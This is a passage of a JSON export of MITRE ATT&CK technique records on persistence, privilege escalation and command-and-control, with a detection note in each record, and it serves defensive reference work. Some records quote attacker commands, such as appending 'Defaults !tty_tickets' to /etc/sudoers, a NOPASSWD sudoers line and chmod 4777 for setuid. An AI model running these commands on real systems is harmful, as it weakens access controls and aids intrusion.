headers. Monitor file systems for changes to application binaries and invalid checksums\/signatures. Changes to binaries that do not line up with application updates or patches are also extremely suspicious.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":638,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":673,"name":"T1546.007 - Netsh Helper DLL","sort_id":0,"external_id":"T1546.007","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh<\/code>.<\/p>\n<p>Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality. (Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the <code>HKLM\\SOFTWARE\\Microsoft\\Netsh<\/code> registry key for any new or suspicious entries that do not correlate with known system files or benign software. (Citation: Demaske Netsh Persistence)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":673,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":703,"name":"T1546.013 - PowerShell Profile","sort_id":0,"external_id":"T1546.013","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1<\/code>) is a script that runs when <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a> starts and can be used as a logon script to customize user environments.<\/p>\n<p><a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a> supports several profiles depending on the user or host program. For example, there can be different profiles for <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a> host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) <\/p>\n<p>Adversaries may modify these profiles to include arbitrary commands, functions, modules, and\/or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a> drives to gain persistence. Every time a user opens a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a> session the modified script will be executed unless the <code>-NoProfile<\/code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) <\/p>\n<p>An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Locations where <code>profile.ps1<\/code> can be stored should be monitored for new profiles or modifications. (Citation: Malware Archaeology PowerShell Cheat Sheet) Example profile locations include:\n\n* <code>$PsHome\\Profile.ps1<\/code>\n* <code>$PsHome\\Microsoft.{HostProgram}_profile.ps1<\/code>\n* <code>$Home\\My Documents\\PowerShell\\Profile.ps1<\/code>\n* <code>$Home\\My Documents\\PowerShell\\Microsoft.{HostProgram}_profile.ps1<\/code>\n\nMonitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules, and\/or execution of unknown programs.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":703,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":740,"name":"T1546.002 - Screensaver","sort_id":0,"external_id":"T1546.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\<\/code>, and <code>C:\\Windows\\sysWOW64\\<\/code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.<\/p>\n<p>The following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\<\/code>) and could be manipulated to achieve persistence:<\/p>\n<ul>\n<li><code>SCRNSAVE.exe<\/code> - set to malicious PE path<\/li>\n<li><code>ScreenSaveActive<\/code> - set to '1' to enable the screensaver<\/li>\n<li><code>ScreenSaverIsSecure<\/code> - set to '0' to not require a password to unlock<\/li>\n<li><code>ScreenSaveTimeout<\/code> - sets user inactivity timeout before screensaver is executed<\/li>\n<\/ul>\n<p>Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor process execution and command-line parameters of .scr files. Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior.\n\nTools such as Sysinternals Autoruns can be used to detect changes to the screensaver binary path in the Registry. Suspicious paths and PE files may indicate outliers among legitimate screensavers in a network and should be investigated.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":740,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":749,"name":"T1548.001 - Setuid and Setgid","sort_id":0,"external_id":"T1548.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>An adversary may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different user\u2019s context. On Linux or macOS, when the setuid or setgid bits are set for an application, the application will run with the privileges of the owning user or group respectively. (Citation: setuid man page). Normally an application is run in the current user\u2019s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn\u2019t need the elevated privileges.<\/p>\n<p>Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an &quot;s&quot; instead of an &quot;x&quot; when viewing a file's attributes via <code>ls -l<\/code>. The <code>chmod<\/code> program can set these bits with via bitmasking, <code>chmod 4777 [file]<\/code> or via shorthand naming, <code>chmod u+s [file]<\/code>.<\/p>\n<p>Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware).<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":749,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":749,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":765,"name":"T1548.003 - Sudo and Sudo Caching","sort_id":0,"external_id":"T1548.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may perform sudo caching and\/or use the suoders file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.<\/p>\n<p>Within Linux and MacOS systems, sudo (sometimes referred to as &quot;superuser do&quot;) allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo<\/code> command &quot;allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.&quot;(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout<\/code>, which is the amount of time in minutes between instances of <code>sudo<\/code> before it will re-prompt for a password. This is because <code>sudo<\/code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>\/var\/db\/sudo<\/code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets<\/code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).<\/p>\n<p>The sudoers file, <code>\/etc\/sudoers<\/code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL<\/code> (Citation: OSX.Dok Malware). Elevated privileges are required to edit this file though.<\/p>\n<p>Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>\/var\/db\/sudo<\/code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout<\/code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets<\/code> is disabled, adversaries can do this from any tty for that user.<\/p>\n<p>In the wild, malware has disabled <code>tty_tickets<\/code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' &gt;&gt; \/etc\/sudoers<\/code> (Citation: cybereason osx proton). In order for this change to be reflected, the malware also issued <code>killall Terminal<\/code>. As of macOS Sierra, the sudoers file has <code>tty_tickets<\/code> enabled by default.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the <code>LOG_INPUT<\/code> and <code>LOG_OUTPUT<\/code> directives in the <code>\/etc\/sudoers<\/code> file.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":765,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":765,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":779,"name":"T1546.005 - Trap","sort_id":0,"external_id":"T1546.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap<\/code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c<\/code> and <code>ctrl+d<\/code>.<\/p>\n<p>Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals<\/code> where &quot;command list&quot; will be executed when &quot;signals&quot; are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Trap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":779,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":779,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":793,"name":"T1546.003 - Windows Management Instrumentation Event Subscription","sort_id":0,"external_id":"T1546.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime. (Citation: Mandiant M-Trends 2015)<\/p>\n<p>Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. (Citation: Dell WMI Persistence) (Citation: Microsoft MOF May 2018)<\/p>\n<p>WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence. (Citation: TechNet Autoruns) (Citation: Medium Detecting WMI Persistence)\n\nMonitor processes and command-line arguments that can be used to register WMI persistence, such as the <code> Register-WmiEvent<\/code> [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1086) cmdlet (Citation: Microsoft Register-WmiEvent), as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process).","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":793,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]}]}]},{"id":18,"name":"Out","tactics":[{"id":17,"name":"Command and Control","source_name":"ENTERPRISE_command-and-control","sort_id":0,"external_id":"TA0011","category_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"framework_stage_id":18,"tactic_id":17},"techniques":[{"id":185,"name":"T1043 - Commonly Used Port","sort_id":0,"external_id":"T1043","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as<\/p>\n<ul>\n<li>TCP:80 (HTTP)<\/li>\n<li>TCP:443 (HTTPS)<\/li>\n<li>TCP:25 (SMTP)<\/li>\n<li>TCP\/UDP:53 (DNS)<\/li>\n<\/ul>\n<p>They may use the protocol associated with the port or a completely different protocol. <\/p>\n<p>For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are <\/p>\n<ul>\n<li>TCP\/UDP:135 (RPC)<\/li>\n<li>TCP\/UDP:22 (SSH)<\/li>\n<li>TCP\/UDP:3389 (RDP)<\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":185,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":185,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":185,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":186,"name":"T1092 - Communication Through Removable Media","sort_id":0,"external_id":"T1092","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by <a href=\"https:\/\/attack.mitre.org\/techniques\/T1091\">Replication Through Removable Media<\/a>. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor file access on removable media. Detect processes that execute when removable media is mounted.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":186,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":186,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":186,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":192,"name":"T1090 - Proxy","sort_id":0,"external_id":"T1090","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including <a href=\"https:\/\/attack.mitre.org\/software\/S0040\">HTRAN<\/a>, ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.<\/p>\n<p>Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\n\nConsider monitoring for traffic to known anonymity networks (such as [Tor](https:\/\/attack.mitre.org\/software\/S0183)).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":192,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":192,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":192,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":199,"name":"T1094 - Custom Command and Control Protocol","sort_id":0,"external_id":"T1094","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may communicate using a custom command and control protocol instead of encapsulating commands\/data in an existing <a href=\"https:\/\/attack.mitre.org\/techniques\/T1071\">Standard Application Layer Protocol<\/a>. Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP\/IP\/another standard network stack.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":199,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":199,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":199,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":200,"name":"T1024 - Custom Cryptographic Protocol","sort_id":0,"external_id":"T1024","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may use a custom cryptographic protocol or algorithm to hide command and control traffic. A simple scheme, such as XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.<\/p>\n<p>Custom encryption schemes may vary in sophistication. Analysis and reverse engineering of malware samples may be enough to discover the algorithm and encryption key used.<\/p>\n<p>Some adversaries may also attempt to implement their own version of a well-known cryptographic algorithm instead of using a known implementation library, which may lead to unintentional errors. (Citation: F-Secure Cosmicduke)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":200,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":200,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":200,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":206,"name":"T1132 - Data Encoding","sort_id":0,"external_id":"T1132","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":206,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":206,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":206,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":209,"name":"T1001 - Data Obfuscation","sort_id":0,"external_id":"T1001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. <\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":209,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":209,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":209,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":222,"name":"T1172 - Domain Fronting","sort_id":0,"external_id":"T1172","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) The technique involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, &quot;domainless&quot; fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).<\/p>\n<p>For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":222,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":222,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":222,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":223,"name":"T1483 - Domain Generation Algorithms","sort_id":0,"external_id":"T1483","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)<\/p>\n<p>DGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: 